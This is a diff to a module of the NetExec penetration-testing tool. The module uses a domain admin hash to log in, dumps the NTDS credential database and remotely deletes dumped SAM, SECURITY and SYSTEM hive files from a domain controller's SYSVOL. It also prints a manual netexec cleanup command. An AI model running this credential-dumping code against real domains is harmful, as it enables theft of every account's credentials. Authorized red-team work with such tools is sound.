@@ -85,21 +85,31 @@ class NXCModule:
             context.log.display(f"Cleaning dump with user {self.domain_admin} and hash {self.domain_admin_hash} on domain {connection.domain}")
             connection.conn.logoff()
             connection.create_conn_obj()
-            connection.hash_login(connection.domain, self.domain_admin, self.domain_admin_hash)
-            connection.execute("del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM")
-            try:
+            if connection.hash_login(connection.domain, self.domain_admin, self.domain_admin_hash):
+                try:
+                    context.log.display("Dumping NTDS...")
+                    connection.ntds()
+                except Exception as e:
+                    context.log.fail(f"Fail to dump the NTDS: {e!s}")
+
+                connection.execute("del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM")
                 for hive in ["SAM", "SECURITY", "SYSTEM"]:
-                    connection.conn.listPath("SYSVOL", log_path + hive)
-            except SessionError as e:
-                if e.getErrorCode() != nt_errors.STATUS_OBJECT_PATH_NOT_FOUND:
-                    context.log.fail("Fail to remove the files...")
-                    sys.exit()
-            context.log.display("Successfully deleted dump files !")
-            context.log.display("Dumping NTDS...")
-            connection.ntds()
+                    try:
+                        connection.conn.listPath("SYSVOL", log_path + hive)
+                    except SessionError as e:
+                        if e.getErrorCode() != nt_errors.STATUS_OBJECT_PATH_NOT_FOUND:
+                            context.log.fail("Fail to remove the files...")
+                            self.suprress_error(context)
+                            sys.exit()
+                context.log.display("Successfully deleted dump files !")
+            else:
+                self.suprress_error(context)
         else:
-            context.log.display("Use the domain admin account to clean the file on the remote host")
-            context.log.display("netexec smb dc_ip -u user -p pass -x 'del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM'")
+            self.suprress_error(context)
+
+    def suprress_error(self, context):
+        context.log.display("Use the domain admin account to clean the file on the remote host")
+        context.log.display("netexec smb dc_ip -u user -p pass -x 'del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM'")
 
     def trigger_winreg(self, connection, context):
         # Original idea from https://twitter.com/splinter_code/status/1715876413474025704
